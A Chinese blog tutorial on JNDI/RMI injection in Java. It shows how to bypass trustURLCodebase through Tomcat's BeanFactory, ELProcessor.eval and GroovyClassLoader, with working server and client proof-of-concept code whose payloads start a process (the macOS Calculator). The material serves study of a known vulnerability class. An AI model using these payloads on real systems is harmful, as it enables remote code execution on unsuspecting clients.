---
order: 3
title: 3. JDNI注入：RMI之绕过trustURLCodebase配置的注入实例演示
tag:
  - Java
  - JNDI
  - RMI
category:
  - Java
  - JNDI
date: 2021-12-20 20:31:55
keywords:
  - Java
  - JNDI
  - RMI
  - 注入
---


上一篇博文介绍了RMI绑定一个Reference，导致加载远程class文件时导致的注入问题，当时有提到对于高级的版本，对于默认的配置为`java.rmi.server.useCodebaseOnly=false`，对于远程的class文件做了安全校验的，但是即便如此，也并没能完全限制住注入

接下来我们来实例演示一下

<!-- more -->

### 1. 注入思路

按照之前的case，RMI服务端提供的是一个远程的class文件，在客户端访问之后，去加载远程Class并实例化，从而导致静态代码块的执行，就带来了注入问题；现在因为`useCodebaseOnly=false`,不支持加载远程class文件，那应该怎么处理呢？

接下来的思路就是既然远程的class不让加载，那么就加载客户端本身的class类，然后通过覆盖其某些方法来实现；

从客户端访问的姿势进行debug，我们可以找到关键的代码节点

- com.sun.jndi.rmi.registry.RegistryContext#lookup(javax.naming.Name)
- com.sun.jndi.rmi.registry.RegistryContext#decodeObject

```java
private Object decodeObject(Remote var1, Name var2) throws NamingException {
    try {
        Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
        Reference var8 = null;
        if (var3 instanceof Reference) {
            var8 = (Reference)var3;
        } else if (var3 instanceof Referenceable) {
            var8 = ((Referenceable)((Referenceable)var3)).getReference();
        }

        if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) {
            throw new ConfigurationException("The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.");
        } else {
            return NamingManager.getObjectInstance(var3, var2, this, this.environment);
        }
    } catch (NamingException var5) {
        throw var5;
    } catch (RemoteException var6) {
        throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
    } catch (Exception var7) {
        NamingException var4 = new NamingException();
        var4.setRootCause(var7);
        throw var4;
    }
}
```

上面这个方法，就是加载class文件并实例化的核心代码，重点关注下面两段

```java
// 默认trustURLCodebase为false，所以不希望进入下面的异常逻辑，则factory_class_location需要为空
if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) {
    throw new ConfigurationException("The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.");
} else {
    return NamingManager.getObjectInstance(var3, var2, this, this.environment);
}
```

从上面的逻辑可以看到，为了不抛出异常，Reference中的factoryClassLocation设置为空；这样就可以继续走下面的`NamingManager.getObjectInstance`流程；最终核心点在下面的实例创建中，获取Factory，创建实例

- javax.naming.spi.NamingManager#createObjectFromFactories

```java
private static Object createObjectFromFactories(Object obj, Name name,
        Context nameCtx, Hashtable<?,?> environment) throws Exception {
    // 工厂类
    FactoryEnumeration factories = ResourceManager.getFactories(
        Context.OBJECT_FACTORIES, environment, nameCtx);

    if (factories == null)
        return null;

    // Try each factory until one succeeds
    ObjectFactory factory;
    Object answer = null;
    while (answer == null && factories.hasMore()) {
        factory = (ObjectFactory)factories.next();
        // 实例化
        answer = factory.getObjectInstance(obj, name, nameCtx, environment);
    }
    return answer;
}
```

从上面的核心实现上，可以看到两个关键信息：

- `javax.naming.spi.ObjectFactory`: 对象工厂类，在客户端找一个这样的工厂类出来，用来创建入侵对象
- `factory.getObjectInstance`: 实例化时，注入我们希望执行的代码

### 2. 注入服务端

首先需要找一个ObjectFactory，我们这里选中的目标是tomcat中的`org.apache.naming.factory.BeanFactory`

接下来看一下它的`getObjectInstance`实现

```java
public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                Hashtable<?,?> environment)
    throws NamingException {
    if (obj instanceof ResourceRef) {
        try {

            Reference ref = (Reference) obj;
            String beanClassName = ref.getClassName();
            Class<?> beanClass = null;
            // 解析forceString，生成对应的 setXxx方法，
            RefAddr ra = ref.get("forceString");
            Map<String, Method> forced = new HashMap<>();
            String value;

            if (ra != null) {
                value = (String)ra.getContent();
                Class<?> paramTypes[] = new Class[1];
                paramTypes[0] = String.class;
                String setterName;
                int index;

                /* Items are given as comma separated list */
                for (String param: value.split(",")) {
                    // 这里的核心，就是解析 forceString, 生成 setXxx 方法，在实例化之后调用
                    try {
                        forced.put(param,
                                   beanClass.getMethod(setterName, paramTypes));
                    } catch (NoSuchMethodException|SecurityException ex) {
                    }
                }
            }

            Enumeration<RefAddr> e = ref.getAll();

            while (e.hasMoreElements()) {
                // forced 执行
                Method method = forced.get(propName);
                try {
                    method.invoke(bean, valueArray);
                } catch (IllegalAccessException e)
                }
                continue;
            }
    }
}
```

上面减去了一些不重要的代码，重点可以看到下面这个逻辑

- 找到一个jvm中存在的类beanClass
- 对于`key = forceString` 的RefAddr，会做一个特殊处理
  - value形如 `argVal = rename`
  - 基于上面的形式，会从beanClass中找到一个名为`methodName = rename`，参数有一个，且为`String`的方法
- 在对象实例化时，会调用上面的方法，其中具体的参数值，从 `RefAddr`中查找key = `argVal` 的取值

举一个实例如下

```java
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
ref.add(new StringRefAddr("forceString", "x=eval"));
ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\")"));
```

上面三行，最终直接的结果就是在创建实例对象时，有下面三步

- 从ElProcessor中找到eval方法

![](/hexblog/imgs/211220/00.jpg)

- 实例化时，调用eval方法，传参为x对应的值

![](/hexblog/imgs/211220/01.jpg)

即在实例化时，相当于执行下面这个方法

```java
ElProcessor.eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\"")
```


因此我们最终的服务端代码可以如下

```java
LocateRegistry.createRegistry(8181);
ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
ref.add(new StringRefAddr("forceString", "x=eval"));
ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\")"));
ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
Naming.bind("rmi://127.0.0.1:8181/inject", referenceWrapper);
```

注意，服务端也需要依赖tomcat，对于SpringBoot项目，可以引入下面这个依赖

```xml
<dependency>
    <groupId>org.apache.tomcat.embed</groupId>
    <artifactId>tomcat-embed-core</artifactId>
</dependency>
```

### 3.实例演示

客户端访问姿势与之前没有什么区别，我们这里基于SpringBoot起一个，主要是方便tomcat服务器的指定

```xml
<dependency>
    <groupId>org.apache.tomcat.embed</groupId>
    <artifactId>tomcat-embed-core</artifactId>
</dependency>
<dependency>
    <groupId>org.apache.tomcat.embed</groupId>
    <artifactId>tomcat-embed-el</artifactId>
</dependency>
```

客户端代码如下

```java
public static void injectTest() throws Exception {
    // 使用JDNI在命名服务中发布引用
    Hashtable env = new Hashtable();
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
    env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:8181");
    InitialContext context = new InitialContext(env);
    Object obj = context.lookup("rmi://127.0.0.1:8181/inject");
    System.out.println(obj);
}

public static void main(String[] args) throws Exception {
    injectTest();
}
```

![a.gif](/hexblog/imgs/211220/02.gif)


### 4.小结

本文通过实例演示介绍了如何绕过`trustURLCodebase=false`的场景，从客户端执行逻辑出发，主要思路就是既然远程的class不可性，那就从目标服务器中去找一个满足条件的class，来执行注入代码

要满足我们注入条件的class，需要有下面这个关键要素

- `javax.naming.spi.ObjectFactory`的子类
- `getObjectInstance`实现类中存在执行目标代码的场景

此外就是借助脚本引擎来动态执行代码，本文是借助js，当然也可以考虑Groovy，如下

```java
// 如果是win系统，exec的传参直接是 calc 即可；下面是macos的执行
ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
ref.add(new StringRefAddr("forceString", "x=parseClass"));
String script = "@groovy.transform.ASTTest(value={\n" +
    "    assert java.lang.Runtime.getRuntime().exec(\"/Applications/Calculator.app/Contents/MacOS/Calculator\")\n" +
    "})\n" +
    "def x\n";
ref.add(new StringRefAddr("x",script));
```

看到这里其实就会有个疑问点，常见的注入代码执行有哪些case呢？除了上面的脚本执行，还有别的么？且看下文


**相关博文**


本文主要思路来自于，欢迎有兴趣的小伙伴查看原文 * [Exploiting JNDI Injections in Java | Veracode blog](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)
